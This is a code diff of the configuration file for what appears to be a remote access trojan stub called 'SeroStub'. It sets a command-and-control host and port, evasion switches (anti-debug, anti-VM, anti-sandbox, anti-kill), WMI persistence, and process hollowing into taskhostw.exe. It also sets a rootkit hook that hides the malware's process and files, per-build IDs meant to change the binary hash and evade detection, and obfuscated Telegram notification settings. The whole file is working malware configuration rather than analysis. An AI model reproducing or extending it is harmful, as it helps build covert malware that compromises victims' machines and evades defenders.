@@ -2,45 +2,52 @@ namespace SeroStub;
 
 internal static class Config
 {
-    public static readonly string[] Hosts = new[] { "localhost" };
-    public const int Port = 2727;
+    public static readonly string[] Hosts = new[] { "127.0.0.1" };
+    public const int Port = 7777;
     public const bool UseMutex = true;
-    public const string MutexName = "Global\\a864d1c20486e7acf2b31060f7a0f063";
+    public const string MutexName = "Global\\fbffb7fb39334bf49fff3c5fdc901064";
 
-    public const bool AntiDebug = true;
+    public const bool AntiDebug = false;
     public const bool AntiVM = false;
-    public const bool AntiDetect = true;
-    public const bool AntiSandbox = true;
-    public const bool BlockCis = true;
+    public const bool AntiDetect = false;
+    public const bool AntiSandbox = false;
+    public const bool BlockCis = false;
 
     public const bool PersistRegistry = false;
     public const bool PersistStartup = false;
     public const bool PersistTask = false;
-    public const bool PersistWmi = true;
-    public const string PersistName = "test";
+    public const bool PersistWmi = false;
+    public const string PersistName = "we";
 
-    public const bool AntiKill = true;
-    public const bool EnableWatchdog = true;
+    public const bool AntiKill = false;
+    public const bool EnableWatchdog = false;
     public const bool EnableHollowing = true;
-    public const string HollowTarget = "svchost.exe";
+    public const string HollowTarget = "taskhostw.exe";
 
-    public const string AuthKey = "XbrUQWE1lZfTR4+Ho8LI73lW/1gjQiEq";
-    public const string CertHash = "700A8415A26C242E4A77FC13CE862990AD2E754A988DB535291B7CCD1ACBB14C";
+    public const string AuthKey = "tWMi3vNzAmgj0cqlzeEq9of00pe+fjR7";
+    public const string CertHash = "07AAB3993AEFC4F6B065B04E1EDA9E20E14649C3852D7079A852B421534AB423";
 
     // Unique per build — changes the compiled binary hash even with identical settings
-    public const string BuildId = "8d1ac3975f3e92add8a80afab78244f5";
+    public const string BuildId = "42c644de0a004b0da665c182ef7531ba";
 
     public const int ReconnectDelayMs = 5000;
     public const int HeartbeatIntervalMs = 3000;
 
-    public const string ClientIdPrefix = "Spas";
+    public const string ClientIdPrefix = "BBB";
 
-    public const string HiddenFileName = "RuntimeBroker.exe";
+    // HiddenProcessName = install filename without extension = DLL prefix
+    // The hook DLL reads its own filename as the prefix and hides everything starting with it.
+    public const string HiddenProcessName = "we";
+    public const string HiddenFileName = "we.exe";
+
+    public const bool EnableRootkit = false;
+    public static readonly byte[] HookDllBytes   = Array.Empty<byte>();
+    public static readonly byte[] HookDllBytes32 = Array.Empty<byte>();
 
     // Telegram notification (SFC64-encoded — never stored as plaintext in binary)
     public const bool TelegramEnabled = false;
     public static readonly byte[] TelegramTokenSfc   = new byte[] {  };
     public static readonly byte[] TelegramChatId1Sfc = new byte[] {  };
     public static readonly byte[] TelegramChatId2Sfc = new byte[] {  };
-    public static readonly byte[] TelegramSfcSeed    = new byte[] { 78, 134, 103, 163, 8, 209, 80, 148, 243, 108, 109, 157, 224, 6, 200, 120, 98, 146, 12, 40, 102, 20, 3, 35, 97, 251, 45, 165, 249, 164, 46, 129 };
+    public static readonly byte[] TelegramSfcSeed    = new byte[] { 127, 46, 155, 63, 237, 249, 252, 46, 128, 197, 126, 206, 211, 87, 152, 146, 224, 116, 214, 89, 113, 171, 100, 34, 108, 182, 124, 24, 171, 40, 87, 249 };
 }
